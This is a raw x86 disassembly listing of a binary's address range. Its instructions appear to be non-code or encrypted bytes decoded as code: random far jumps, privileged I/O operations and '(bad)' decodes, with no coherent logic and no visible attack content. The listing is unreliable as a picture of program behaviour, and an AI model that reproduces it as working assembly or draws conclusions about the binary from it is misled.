  416554:	push   ds
  416555:	push   edx
  416556:	push   es
  416557:	xor    al,0xdf
  416559:	retf   0xce8f
  41655c:	inc    edx
  41655d:	jo     0x41654b
  41655f:	clc    
  416560:	outs   dx,DWORD PTR ds:[esi]
  416561:	arpl   WORD PTR [edx+0x53],di
  416564:	and    ecx,DWORD PTR [ecx+0x1f04a777]
  41656a:	inc    edi
  41656b:	into   
  41656c:	mov    al,0x65
  41656e:	test   al,0xeb
  416570:	adc    al,BYTE PTR [edx-0x6b8d938c]
  416576:	and    dh,BYTE PTR [edi+esi*4]
  416579:	inc    edi
  41657a:	jge    0x4165c4
  41657c:	loop   0x416555
  41657e:	popa   
  41657f:	push   edx
  416580:	lock pop ss
  416582:	xchg   ebp,eax
  416583:	cdq    
  416584:	add    edx,edi
  416586:	sbb    dh,al
  416588:	or     ch,BYTE PTR [ebp+0x67c23d23]
  41658e:	fld    TBYTE PTR [ecx+0x6b6e035]
  416594:	gs dec edi
  416596:	add    al,0x1d
  416598:	popf   
  416599:	mov    eax,DWORD PTR [eax+edx*2]
  41659c:	or     al,0x10
  41659e:	or     ecx,ebp
  4165a0:	mov    DWORD PTR ss:[eax],eax
  4165a3:	stc    
  4165a4:	adc    ah,0x37
  4165a7:	shr    DWORD PTR [edx],0x87
  4165aa:	mov    DWORD PTR ds:0x3be994f1,0xfae1dfc5
  4165b4:	fild   QWORD PTR [edx+ecx*1+0x4e5a9b39]
  4165bb:	mov    ss:0x31cb7a91,eax
  4165c1:	in     eax,dx
  4165c2:	loop   0x416552
  4165c4:	jb     0x41657b
  4165c6:	fcomp  QWORD PTR [edx]
  4165c8:	ret    0x1d8c
  4165cb:	pop    ebx
  4165cc:	ja     0x4165e2
  4165ce:	and    BYTE PTR [ecx+ecx*2],cl
  4165d1:	addr16 mov al,ds:0xcdfb
  4165d5:	lods   eax,DWORD PTR ds:[esi]
  4165d6:	adc    dh,BYTE PTR [ebx+eiz*8-0x6bcc9c19]
  4165dd:	aam    0x32
  4165df:	xchg   ebx,eax
  4165e0:	stc    
  4165e1:	enter  0x96d2,0xf5
  4165e5:	mov    ebp,DWORD PTR [esi-0x5d]
  4165e8:	mov    cl,0x7
  4165ea:	inc    ebx
  4165eb:	icebp  
  4165ec:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4165ed:	bnd ret 0x6cf9
  4165f1:	sar    BYTE PTR [ebp+0x21],0x44
  4165f5:	add    al,BYTE PTR ds:0x6b270327
  4165fb:	add    cl,BYTE PTR [esi+0x47]
  4165fe:	jnp    0x4165db
  416600:	dec    ecx
  416601:	push   0xffffff8d
  416603:	lahf   
  416604:	add    cl,BYTE PTR [edi-0x2d]
  416607:	sub    al,0xbb
  416609:	les    edx,FWORD PTR [edi]
  41660b:	add    al,0x11
  41660d:	mul    BYTE PTR [ebp+0x546e7ffc]
  416613:	hlt    
  416614:	enter  0x9596,0x42
  416618:	fld    TBYTE PTR [ebx]
  41661a:	or     eax,0xd542e8e8
  41661f:	ret    0xa661
  416622:	in     eax,dx
  416623:	jp     0x4165de
  416625:	jnp    0x41661d
  416627:	or     ch,ch
  416629:	mov    esp,0x201d6e63
  41662e:	fiadd  WORD PTR [eax]
  416630:	es je  0x4165d0
  416633:	mov    ebp,0xdd70d749
  416638:	cmp    eax,0xe9f87894
  41663d:	xchg   DWORD PTR [edx-0x324bfb66],edx
  416643:	xor    dh,BYTE PTR [edi-0x3ab98178]
  416649:	bound  esi,QWORD PTR [edi]
  41664b:	adc    DWORD PTR [eax-0x1],edi
  41664e:	inc    edi
  41664f:	xchg   ebp,eax
  416650:	sub    DWORD PTR [eax-0x72],0xffffffdf
  416654:	call   0xfbb123b7
  416659:	repz jp 0x416664
  41665c:	fsub   QWORD PTR [edi-0x52822e85]
  416662:	pop    ecx
  416663:	hlt    
  416664:	add    ebx,DWORD PTR [ebx+0x6cf0bb2f]
  41666a:	test   BYTE PTR [edx-0x29],bl
  41666d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41666e:	dec    eax
  41666f:	sbb    edi,DWORD PTR [esi+ecx*8-0x58]
  416673:	xchg   ecx,eax
  416674:	outs   dx,BYTE PTR ds:[esi]
  416675:	mov    WORD PTR [ecx-0x4fec5da2],?
  41667b:	es pop ds
  41667d:	stc    
  41667e:	push   es
  41667f:	push   eax
  416680:	dec    ebx
  416681:	mov    dl,0x1
  416683:	fs or  al,0x26
  416686:	mov    eax,0x2952d47a
  41668b:	dec    ebp
  41668c:	fwait
  41668d:	jnp    0x4166b3
  41668f:	retf   0x6a92
  416692:	or     bl,BYTE PTR [ecx+0x6a]
  416695:	add    al,0x5b
  416697:	inc    ebx
  416698:	xchg   ebx,ecx
  41669a:	sub    ebx,ecx
  41669c:	jmp    0x416980
  4166a1:	cmc    
  4166a2:	icebp  
  4166a3:	retf   
  4166a4:	mov    ebp,0x717165cb
  4166a9:	test   BYTE PTR [ebx-0x79],dl
  4166ac:	jnp    0x416720
  4166ae:	sbb    al,0xc0
  4166b0:	test   al,0x5c
  4166b2:	adc    bh,BYTE PTR [edi+0x70]
  4166b5:	mov    ecx,0x7570707e
  4166ba:	div    BYTE PTR [ecx+ebp*4-0x10]
  4166be:	xor    DWORD PTR [edi-0xb],0xff0c8114
  4166c5:	jge    0x416712
  4166c7:	shr    BYTE PTR [edx+0x6f0f9bc7],cl
  4166cd:	mov    esp,0x97a2d02f
  4166d2:	cwde   
  4166d3:	and    al,0x9a
  4166d5:	dec    esi
  4166d6:	pop    esp
  4166d7:	xchg   edi,eax
  4166d8:	icebp  
  4166d9:	lea    ecx,[edi+0x3288bc91]
  4166df:	cdq    
  4166e0:	mov    dh,0x55
  4166e2:	(bad)  
  4166e3:	adc    bh,BYTE PTR [ecx-0x30c0b212]
  4166e9:	jns    0x4166a1
  4166eb:	dec    ebp
  4166ec:	mov    ebx,0x37496b2c
  4166f1:	iret   
  4166f2:	xchg   edx,eax
  4166f3:	and    esi,DWORD PTR [ecx-0x2b]
  4166f6:	inc    edx
  4166f7:	mov    bh,0x25
  4166f9:	mov    esp,0xf453b1b0
  4166fe:	stc    
  4166ff:	lods   al,BYTE PTR ds:[esi]
  416700:	dec    esp
  416701:	mov    bl,0x7c
  416703:	adc    al,0x4d
  416705:	mov    ds:0x983a52,al
  41670a:	jmp    FWORD PTR [ecx+0x66]
  41670d:	push   ecx
  41670e:	arpl   sp,cx
  416710:	xchg   esp,eax
  416711:	lea    esi,[edi]
  416713:	push   edx
  416714:	cmp    BYTE PTR [edx+0xd],ah
  416717:	sub    dl,ch
  416719:	mov    ah,0xd0
  41671b:	sti    
  41671c:	and    eax,0x6edde82e
  416721:	je     0x4167a1
  416723:	push   ecx
  416724:	mov    ebp,0xc6bc0a0
  416729:	pop    edx
  41672a:	cmp    BYTE PTR [esi-0x9],ch
  41672d:	lock jb 0x4166f8
  416730:	push   cs
  416731:	or     esp,DWORD PTR [ebp-0x34fdb123]
  416737:	mov    esi,0xf889bcd7
  41673c:	pop    ds
  41673d:	and    al,0xd2
  41673f:	scas   al,BYTE PTR es:[edi]
  416740:	sbb    bl,BYTE PTR [ebp-0x50]
  416743:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416744:	xchg   ebp,eax
  416745:	out    dx,eax
  416746:	cmp    DWORD PTR [ebx],edi
  416748:	or     al,0x76
  41674a:	aad    0xc5
  41674c:	sub    dl,dh
  41674e:	jb     0x4166df
  416750:	scas   al,BYTE PTR es:[edi]
  416751:	pop    ebx
  416752:	mov    edx,0x321f4570
  416757:	aaa    
  416758:	lds    ebp,FWORD PTR [ebp+0x29]
  41675b:	mov    bl,0xdc
  41675d:	shl    DWORD PTR [ecx-0x2f69ab15],1
  416763:	or     ebx,ebp
  416765:	aad    0x43
  416767:	mov    al,0xb9
  416769:	or     dl,BYTE PTR [ebx+ebp*1-0x15]
  41676d:	cld    
  41676e:	daa    
  41676f:	call   0x6a3:0xe6866266
  416776:	ds mov dh,0xcf
  416779:	mov    DWORD PTR [eax-0x10],esp
  41677c:	jb     0x4167d7
  41677e:	inc    ebx
  41677f:	mov    ebx,0x217825be
  416784:	shl    BYTE PTR [esi+0x4ae302e5],0x2a
  41678b:	xchg   DWORD PTR [edx+0x17],ebp
  41678e:	push   cs
  41678f:	jno    0x41674f
  416791:	jnp    0x416757
  416793:	repnz and ebp,DWORD PTR [ecx-0x45]
  416797:	xchg   DWORD PTR [esi],edx
  416799:	fnstsw WORD PTR [ebp+0x19f4c765]
  41679f:	loopne 0x4167b1
  4167a1:	cmp    ebx,DWORD PTR ds:0x99147b8f
  4167a7:	or     cl,ch
  4167a9:	and    esi,DWORD PTR [edi]
  4167ab:	inc    ebp
  4167ac:	data16 sbb cl,BYTE PTR [esi+ebp*1-0xd99c1dd]
  4167b4:	cld    
  4167b5:	push   eax
  4167b6:	mov    ebx,0xcd298540
  4167bb:	xor    bl,al
  4167bd:	icebp  
  4167be:	adc    DWORD PTR ss:[ebp-0x62],edx
  4167c2:	jmp    0x7c574e98
  4167c7:	pop    ebp
  4167c8:	bound  edi,QWORD PTR [ebx+0x77a26600]
  4167ce:	mov    bl,0x6c
  4167d0:	push   cs
  4167d1:	scas   al,BYTE PTR es:[edi]
  4167d2:	mov    esi,0x8d058193
  4167d7:	jns    0x4167a1
  4167d9:	test   al,0x7b
  4167db:	dec    esi
  4167dc:	jnp    0x4167fd
  4167de:	out    dx,eax
  4167df:	rol    BYTE PTR [eax-0x4e],cl
  4167e2:	mov    dl,0x9d
  4167e4:	cmc    
  4167e5:	mov    al,0xf5
  4167e7:	mov    BYTE PTR [ecx],bl
  4167e9:	call   0x7e91d773
  4167ee:	test   DWORD PTR [edi],esi
  4167f0:	call   0x3aef899e
  4167f5:	sbb    ch,cl
  4167f7:	int3   
  4167f8:	xchg   esp,eax
  4167f9:	lahf   
  4167fa:	add    BYTE PTR ds:0x8de5e81e,al
  416800:	mov    ah,BYTE PTR ds:0xccc6a817
  416806:	push   esp
  416807:	and    al,0x55
  416809:	adc    edx,DWORD PTR [eax]
  41680b:	dec    ebx
  41680c:	xor    ch,dh
  41680e:	push   ebx
  41680f:	mov    dh,0x69
  416811:	xchg   esi,eax
  416812:	mov    ds:0xc02e63d6,al
  416817:	mov    dh,BYTE PTR ds:0x32da56cd
  41681d:	push   ecx
  41681e:	call   0xf9382900
  416823:	gs (bad) 
  416825:	aam    0xda
  416827:	aaa    
  416828:	add    DWORD PTR [eax-0x618e8c1f],0x4d
  41682f:	fisubr WORD PTR gs:[ebp+0x78]
  416833:	mov    ?,WORD PTR ds:0x6ee2e2ea
  416839:	mov    bl,0x1e
  41683b:	push   ds
  41683c:	in     al,dx
  41683d:	pop    ebp
  41683e:	mov    al,0x38
  416840:	stos   DWORD PTR es:[edi],eax
  416841:	test   dl,0xe2
  416844:	and    esp,ebp
  416846:	fs sub ebp,ecx
  416849:	into   
  41684a:	js     0x416892
  41684c:	adc    eax,DWORD PTR [edx-0x6a7fd9db]
  416852:	push   ebx
  416853:	aaa    
  416854:	mov    edi,0x997cf031
  416859:	push   ebp
  41685a:	push   ebx
  41685b:	sahf   
  41685c:	push   cs
  41685d:	pop    ecx
  41685e:	call   FWORD PTR [eax-0x61dd87e9]
  416864:	or     ebp,0x64d9b3a9
  41686a:	inc    ebx
  41686b:	jmp    0xc2d:0x50a7c6aa
  416872:	add    al,0x3b
  416874:	aad    0x2a
  416876:	add    al,0x94
  416878:	imul   esi,DWORD PTR [ebx],0x30
  41687b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41687c:	mov    cl,0xc7
  41687e:	inc    ebx
  41687f:	mov    WORD PTR [edi],cx
  416882:	out    0x84,al
  416884:	mov    esi,eax
  416886:	aad    0x6c
  416888:	pop    ecx
  416889:	inc    esp
  41688a:	(bad)
  41688e:	call   0xc6a97496
  416893:	aas    
  416894:	push   ebx
  416895:	mov    eax,ds:0x657759de
  41689a:	push   0xffffffda
  41689c:	sub    edx,ebp
  41689e:	fisub  WORD PTR [eax-0x566d61b0]
  4168a4:	imul   ecx,ecx,0x1451b572
  4168aa:	out    0x43,al
  4168ac:	mov    esp,0x58c369
  4168b1:	int    0x5
  4168b3:	cmp    edx,DWORD PTR [edx+eax*1+0x5]
  4168b7:	dec    ebx
  4168b8:	aaa    
  4168b9:	repnz das 
  4168bb:	mov    ebp,0xd3181f5
  4168c0:	xchg   esp,eax
  4168c1:	sbb    ch,BYTE PTR [ecx+eiz*8-0x5d]
  4168c5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4168c6:	rcr    ch,cl
  4168c8:	mov    ebp,0xbe59bf0a
  4168cd:	imul   edi,edx,0xa328c10
  4168d3:	push   ss
  4168d4:	and    edi,ebp
  4168d6:	mov    al,0x15
  4168d8:	push   eax
  4168d9:	sar    DWORD PTR cs:[ebp-0x77164573],cl
  4168e0:	fwait
  4168e1:	sub    ebx,edi
  4168e3:	repnz mov DWORD PTR [edi+0x50],ecx
  4168e7:	mov    ?,WORD PTR [edi]
  4168e9:	inc    ebx
  4168ea:	loope  0x4168db
  4168ec:	fiadd  WORD PTR [ebp+0x340dc1a7]
  4168f2:	aam    0x5e
  4168f4:	pop    esi
  4168f5:	jb     0x416956
  4168f7:	adc    BYTE PTR [ecx],ch
  4168f9:	fst    QWORD PTR [esi+0x220d8064]
  4168ff:	pop    ds
  416900:	or     DWORD PTR [ecx],ebp
  416902:	retf   
  416903:	nop
  416904:	imul   ebp,DWORD PTR [eax+0x8],0x28
  416908:	lods   al,BYTE PTR ds:[esi]
  416909:	sbb    eax,0x57e32965
  41690e:	inc    edi
  41690f:	scas   eax,DWORD PTR es:[edi]
  416910:	sahf   
  416911:	arpl   WORD PTR [esi+0x61e11e80],bx
  416917:	xchg   ebp,eax
  416918:	pop    esp
  416919:	sar    DWORD PTR ds:0xe11a5df5,1
  41691f:	ins    DWORD PTR es:[edi],dx
  416920:	ss lahf 
  416922:	fidiv  WORD PTR [esi]
  416924:	xor    eax,0xe0f6db72
  416929:	jle    0x41697a
  41692b:	mov    dl,0xde
  41692d:	cmp    DWORD PTR [esi-0x3a],ebp
  416930:	add    eax,0x5698b159
  416935:	js     0x416958
  416937:	loopne 0x416964
  416939:	sti    
  41693a:	stos   DWORD PTR es:[edi],eax
  41693b:	sub    DWORD PTR [ecx],eax
  41693d:	inc    edi
  41693e:	push   ecx
  41693f:	inc    ebx
  416940:	inc    ebx
  416941:	rol    DWORD PTR [edx],0xa
  416944:	xchg   ebx,eax
  416945:	pop    edx
  416946:	and    ah,BYTE PTR [eax-0x1af297f1]
  41694c:	mov    ecx,0x64a74064
  416951:	dec    edx
  416952:	test   eax,0xb7155ab5
  416957:	mov    ds:0xcccdb2db,eax
  41695c:	lahf   
  41695d:	test   esi,esi
  41695f:	adc    eax,0x70b40e0a
  416964:	pop    ebx
  416965:	pop    ebx
  416966:	mov    al,0x14
  416968:	xchg   esp,eax
  416969:	jae    0x4169b5
  41696b:	test   al,0xe5
  41696d:	mov    edi,0x2fa7543d
  416972:	add    DWORD PTR [edi+0xb],0xa75569ad
  416979:	ss leave 
  41697b:	dec    edx
  41697c:	jl     0x416931
  41697e:	ins    DWORD PTR es:[edi],dx
  41697f:	aaa    
  416980:	xchg   ebx,ecx
  416982:	jmp    0x416c66
  416987:	cmc    
  416988:	std    
  416989:	fs mov ah,0x74
  41698c:	jno    0x416983
  41698e:	mov    ecx,0x2f2f76b9
  416993:	lods   eax,DWORD PTR ds:[esi]
  416994:	call   0x1fe7394c
  416999:	jg     0x416a0b
  41699b:	mov    ecx,0x1f70707e
  4169a0:	out    0xe,eax
  4169a2:	sbb    edi,edx
  4169a4:	sar    ecx,0xd4
  4169a7:	imul   esi,esp,0x3b
  4169aa:	ins    BYTE PTR es:[edi],dx
  4169ab:	inc    edx
  4169ac:	or     eax,0x72e5860d
  4169b1:	or     esi,esi
  4169b3:	mov    bh,0xa
  4169b5:	sub    dl,BYTE PTR [eax]
  4169b7:	rol    BYTE PTR [edx+0x50],cl
  4169ba:	popf   
  4169bb:	pop    ecx
  4169bc:	enter  0x48bc,0xc
  4169c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4169c1:	dec    ecx
  4169c2:	out    dx,eax
  4169c3:	sub    BYTE PTR [bx+di],ah
  4169c6:	int    0xe6
  4169c8:	adc    ebx,ebp
  4169ca:	sti    
  4169cb:	cmp    DWORD PTR [ebp+0x11],0x3a
  4169cf:	jmp    0x416a3d
  4169d1:	jno    0x416a30
  4169d3:	jns    0x416a45
  4169d5:	rol    DWORD PTR [eax-0x5b37de99],0x27
  4169dc:	sbb    esp,DWORD PTR [esi+0x5a]
  4169df:	outs   dx,BYTE PTR ds:[esi]
  4169e0:	and    ebx,DWORD PTR [eax+eiz*8]
  4169e3:	mov    ah,0x12
  4169e5:	test   DWORD PTR [ebx+0xd],eax
  4169e8:	and    ah,BYTE PTR [ebp+0x5c]
  4169eb:	mov    BYTE PTR [edx-0x52],al
  4169ee:	ficom  DWORD PTR [ebx+eax*2+0x59ec3f]
  4169f5:	push   ss
  4169f6:	lock xchg edx,eax
  4169f8:	(bad)  
  4169f9:	rcr    al,1
  4169fb:	push   ecx
  4169fc:	(bad)  
  4169fd:	mov    eax,0x229f127
  416a02:	pop    ebp
  416a03:	cs adc eax,0x1aaa3556
  416a09:	leave  
  416a0a:	dec    edx
  416a0b:	cwde   
  416a0c:	lahf   
  416a0d:	dec    esi
  416a0e:	mov    ah,0x85
  416a10:	fs pop es
  416a12:	mov    ah,0xe7
  416a14:	out    dx,al
  416a15:	(bad)  
  416a16:	addr16 aaa 
  416a18:	sub    edi,DWORD PTR [eax]
  416a1a:	sub    eax,0xa4c68955
  416a1f:	loop   0x416a95
  416a21:	dec    esp
  416a22:	ins    BYTE PTR es:[edi],dx
  416a23:	mov    WORD PTR [ebx],gs
  416a25:	fcomp  QWORD PTR [ecx]
  416a27:	ins    BYTE PTR es:[edi],dx
  416a28:	call   0x8b34d31b
  416a2d:	pop    ebx
  416a2e:	jo     0x416a30
  416a30:	pop    ds
  416a31:	sub    BYTE PTR [ebp-0x67],bh
  416a34:	and    BYTE PTR [ebx+ebp*4+0xe],ah
  416a38:	adc    al,0x22
  416a3a:	jns    0x416a02
  416a3c:	push   cs
  416a3d:	mov    edx,0xe26d7c50
  416a42:	ss aam 0x42
  416a45:	sbb    BYTE PTR [ecx],0x1d
  416a48:	fstp   TBYTE PTR [edx]
  416a4a:	shl    DWORD PTR [ebp+0x4206e5c0],cl
  416a50:	hlt    
  416a51:	jge    0x416a65
  416a53:	xor    bl,ah
  416a55:	or     al,BYTE PTR es:[edi-0x77955bcd]
  416a5c:	jns    0x416a87
  416a5e:	mov    dh,0xf3
  416a60:	cs inc esi
  416a62:	adc    DWORD PTR ds:0xdd262fe9,edx
  416a68:	repnz test al,0xa4
  416a6b:	mov    edi,0xcc4acbaa
  416a70:	ror    DWORD PTR [eax-0x7b],cl
  416a73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416a74:	jp     0x416a95
  416a76:	mov    WORD PTR [edi],fs
  416a78:	shl    BYTE PTR [edi-0x60],1
  416a7b:	and    BYTE PTR [eax+ebp*8+0x3258f18b],0x20
  416a83:	daa    
  416a84:	daa    
  416a85:	(bad)  
  416a86:	adc    ah,BYTE PTR [edi-0x2d]
  416a89:	gs adc edi,edx
  416a8c:	inc    esi
  416a8d:	mov    edx,0x9d19eafb
  416a92:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416a93:	fs test eax,0xd71a9087
  416a99:	push   edi
  416a9a:	cli    
  416a9b:	in     al,0x3b
  416a9d:	aas    
  416a9e:	push   ss
  416a9f:	or     BYTE PTR [ebp+0x85f37ae],al
  416aa5:	in     eax,dx
  416aa6:	xchg   ecx,eax
  416aa7:	dec    ecx
  416aa8:	les    eax,FWORD PTR [ecx-0x7e66f5d7]
  416aae:	mov    esp,0x5ec45783
  416ab3:	jne    0x416ac7
  416ab5:	mov    esp,0xfb63d9d0
  416aba:	dec    ebp
  416abb:	je     0x416ab9
  416abd:	cmp    eax,0x4397c8a1
  416ac2:	inc    esi
  416ac3:	push   eax
  416ac4:	jge    0x416b08
  416ac6:	adc    dh,BYTE PTR [edx-0xe]
  416ac9:	sub    esi,DWORD PTR [ebx]
  416acb:	(bad)  
  416acc:	pushf  
  416acd:	mov    bl,0xc2
  416acf:	jb     0x416b37
  416ad1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ad2:	mov    ds:0xd306120d,al
  416ad7:	fst    DWORD PTR [ebp+0x2c2767ec]
  416add:	jne    0x416a7a
  416adf:	add    DWORD PTR [edx+0x4fbf457c],edx
  416ae5:	pop    ebx
  416ae6:	pop    esp
  416ae7:	fstp   QWORD PTR [ecx]
  416ae9:	push   es
  416aea:	mov    eax,0x561179d5
  416aef:	cmp    dl,BYTE PTR [esi]
  416af1:	pop    esi
  416af2:	sub    DWORD PTR [edx-0x534fb8bb],ebx
  416af8:	add    bh,bh
  416afa:	jbe    0x416b5c
  416afc:	xchg   ebp,eax
  416afd:	inc    eax
  416afe:	int    0x4c
  416b00:	shl    DWORD PTR [ecx-0x40],cl
  416b03:	sub    DWORD PTR ds:0xd2ba708e,ecx
  416b09:	in     al,0x58
  416b0b:	lds    esi,FWORD PTR [eax-0xc55b8dc]
  416b11:	xor    al,0xc7
  416b13:	pushf  
  416b14:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b15:	jb     0x416b17
  416b17:	pusha  
  416b18:	mov    bl,0x43
  416b1a:	jmp    0x416b49
  416b1c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416b1d:	nop
  416b1e:	mov    ds:0xd7b8f62c,al
  416b23:	icebp  
  416b24:	stc    
  416b25:	bound  edx,QWORD PTR [edx]
  416b27:	iret   
  416b28:	push   ss
  416b29:	pop    edi
  416b2a:	shr    bh,0x39
  416b2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416b2e:	outs   dx,BYTE PTR ds:[esi]
  416b2f:	imul   ecx,DWORD PTR [ebx],0x45
  416b32:	jns    0x416ac7
  416b34:	(bad)  
  416b35:	cmp    ebp,DWORD PTR [esi]
  416b37:	xor    bl,dl
  416b39:	outs   dx,DWORD PTR ds:[esi]
  416b3a:	outs   dx,DWORD PTR ds:[esi]
  416b3b:	xlat   BYTE PTR ds:[ebx]
  416b3c:	loop   0x416af2
  416b3e:	jo     0x416bb8
  416b40:	mov    eax,0x1e4fe7e5
  416b45:	clc    
  416b46:	retf   0xba8a
  416b49:	ins    DWORD PTR es:[edi],dx
  416b4a:	popa   
  416b4b:	sub    esp,DWORD PTR [edx+ebx*1+0x6c]
  416b4f:	cmp    bl,0x40
  416b52:	pop    ds
  416b53:	inc    edx
  416b54:	aaa    
  416b55:	test   DWORD PTR [ebp-0x225b1c3d],edi
  416b5b:	sub    edx,DWORD PTR [ebx+0x6c84a3ba]
  416b61:	adc    eax,0x54f57b15
  416b66:	dec    ebx
  416b67:	ins    BYTE PTR es:[edi],dx
  416b68:	sahf   
  416b69:	(bad)  
  416b6a:	imul   ebx,DWORD PTR [edx],0x167a3a06
  416b70:	lds    edi,FWORD PTR ds:0xffa7f65b
  416b76:	rep ins BYTE PTR es:[edi],dx
  416b78:	scas   al,BYTE PTR es:[edi]
  416b79:	mov    dh,0xe
  416b7b:	adc    BYTE PTR [esi+edx*8-0x7d0c1a30],bl
  416b82:	imul   eax,DWORD PTR [eax+0x79],0x32
  416b86:	mov    al,ds:0xea493ee5
  416b8b:	shr    DWORD PTR [edx+0x50a636],cl
  416b91:	add    esp,ebp
  416b93:	ins    DWORD PTR es:[edi],dx
  416b94:	inc    ebp
  416b95:	ins    BYTE PTR es:[edi],dx
  416b96:	rcl    DWORD PTR [edx-0x10],0xa5
  416b9a:	ja     0x416be7
  416b9c:	gs test al,0x7f
  416b9f:	xor    BYTE PTR [ecx+0x57],cl
  416ba2:	jbe    0x416bab
  416ba4:	outs   dx,DWORD PTR ds:[esi]
  416ba5:	mov    bl,0x6f
  416ba8:	stos   DWORD PTR es:[edi],eax
  416ba9:	sbb    DWORD PTR [ecx],edi
  416bab:	push   0xffffffe3
  416bad:	inc    esi
  416bae:	outs   dx,BYTE PTR ds:[esi]
  416baf:	das    
  416bb0:	hlt    
  416bb1:	push   es
  416bb2:	cld    
  416bb3:	imul   ebx,edx,0xffffff9c
  416bb6:	xor    DWORD PTR [eax-0x38624e6d],edx
  416bbc:	(bad)  
  416bbe:	int    0x27
  416bc0:	pushf  
  416bc1:	xchg   edx,eax
  416bc2:	sbb    eax,0xc3891eb8
  416bc7:	and    ebx,DWORD PTR [ecx-0x74954222]
  416bcd:	pop    ebp
  416bce:	jo     0x416c0a
  416bd0:	outs   dx,DWORD PTR ds:[esi]
  416bd1:	push   eax
  416bd2:	jo     0x416c2b
  416bd4:	test   eax,0x79af41d1
  416bd9:	pop    edx
  416bda:	push   edx
  416bdb:	mov    ecx,0xead9f48d
  416be0:	ss cwde 
  416be2:	lahf   
  416be3:	ret    
  416be4:	pop    ss
  416be5:	xchg   edi,eax
  416be6:	shl    BYTE PTR [eax],cl
  416be8:	inc    ecx
  416be9:	mov    ds:0x298f6ee,eax
  416bee:	inc    ebp
  416bef:	inc    ebx
  416bf0:	sar    BYTE PTR [eax],1
  416bf2:	sub    ebp,DWORD PTR [esi-0x7496f739]
  416bf8:	adc    bl,BYTE PTR [esi+0x52]
  416bfb:	add    DWORD PTR [eax+0x4da6c7ad],eax
  416c01:	push   edx
  416c02:	sbb    dl,dh
  416c04:	and    ah,BYTE PTR [ecx*2-0x296ce7f2]
  416c0b:	inc    edx
  416c0c:	xchg   BYTE PTR [eax],ah
  416c0e:	add    BYTE PTR [eax-0x64b0ca34],ch
  416c14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c15:	jge    0x416c17
  416c17:	aas    
  416c18:	sti    
  416c19:	into   
  416c1a:	jmp    0x1f877f0e
  416c1f:	sbb    edx,DWORD PTR [ebx+edi*8+0x5c]
  416c23:	push   ds
  416c24:	inc    eax
  416c25:	stos   BYTE PTR es:[edi],al
  416c26:	mov    ebp,0xedd185a3
  416c2b:	ds clc 
  416c2d:	fwait
  416c2e:	jge    0x416ca1
  416c30:	adc    eax,0x672eecb7
  416c35:	data16 cmc 
  416c37:	bound  esp,QWORD PTR ds:0x8a3c7fc2
  416c3d:	mov    cl,0xe3
  416c3f:	jno    0x416c70
  416c41:	mov    edx,0xed774357
  416c46:	push   es
  416c47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416c48:	sbb    DWORD PTR [edi],ebp
  416c4a:	out    0xae,eax
  416c4c:	xchg   ebx,eax
  416c4d:	popa   
  416c4e:	xchg   ebp,eax
  416c4f:	jmp    0x416c65
  416c51:	lods   al,BYTE PTR ds:[esi]
  416c52:	scas   al,BYTE PTR es:[edi]
  416c53:	in     eax,0x45
  416c55:	sbb    al,0x3f
  416c57:	scas   al,BYTE PTR es:[edi]
  416c58:	sub    eax,0x94de4db8
  416c5d:	shl    DWORD PTR [eax-0x23],1
  416c60:	mov    eax,0x69e9f438
  416c65:	push   0x49
  416c67:	mov    eax,DWORD PTR [ebp-0x1c]
  416c6a:	jmp    0x416f4e
  416c6f:	outs   dx,BYTE PTR ds:[esi]
  416c70:	ds push eax
  416c72:	loopne 0x416cd4
  416c74:	outs   dx,BYTE PTR ds:[esi]
  416c75:	outs   dx,BYTE PTR ds:[esi]
  416c76:	mov    esi,0xcbfa089
  416c7b:	mov    dl,0x89
  416c7d:	sub    ebx,DWORD PTR [esi-0x12]
  416c80:	sbb    al,0x7f
  416c82:	jo     0x416c3d
  416c84:	jle    0x416cf6
  416c86:	jo     0x416c86
  416c88:	shl    BYTE PTR [edx-0x2],cl
  416c8b:	pop    ebp
  416c8c:	lock int3 
  416c8e:	add    eax,0x86c64e23
  416c93:	adc    al,BYTE PTR [edx-0x42d8fa6b]
  416c99:	pop    ds
  416c9a:	pop    es
  416c9b:	xor    BYTE PTR [edx],dl
  416c9d:	adc    eax,0x15cdac22
  416ca2:	repnz sub edx,DWORD PTR [ebx-0x5b]
  416ca6:	in     al,dx
  416ca7:	shr    BYTE PTR [esi+0x42],cl
  416caa:	mov    esi,0x1e2f7125
  416caf:	ja     0x416c89
  416cb1:	jnp    0x416cb4
  416cb3:	data16 jno 0x416d35
  416cb6:	lods   eax,DWORD PTR ds:[esi]
  416cb7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416cb8:	inc    edi
  416cb9:	aad    0x71
  416cbb:	dec    ecx
  416cbc:	push   ecx
  416cbd:	sub    eax,0xd398c510
  416cc2:	fistp  WORD PTR [edx-0x48ef5d40]
  416cc8:	push   eax
  416cc9:	dec    edx
  416cca:	cmp    al,0x38
  416ccc:	not    DWORD PTR [ecx-0xa43dca3]
  416cd2:	jl     0x416d45
  416cd4:	sub    BYTE PTR [ecx+esi*4],0xc9
  416cd8:	fcom   DWORD PTR [esi]
  416cda:	mov    DWORD PTR [ebp+0x1571d070],esi
  416ce0:	rep stos DWORD PTR es:[edi],eax
  416ce2:	out    0xb7,al
  416ce4:	jno    0x416d64
  416ce6:	shl    DWORD PTR [ebx-0x6ef0ea04],cl
  416cec:	loopne 0x416c81
  416cee:	xchg   ecx,eax
  416cef:	das    
  416cf0:	mul    BYTE PTR [edx+0x72a16ec6]
  416cf6:	add    dl,BYTE PTR ds:[eax-0x5652ae1]
  416cfd:	jno    0x416cdd
  416cff:	jl     0x416c8e
  416d01:	(bad)  
  416d02:	mov    ecx,0x945214ac
  416d07:	pusha  
  416d08:	jp     0x416cdf
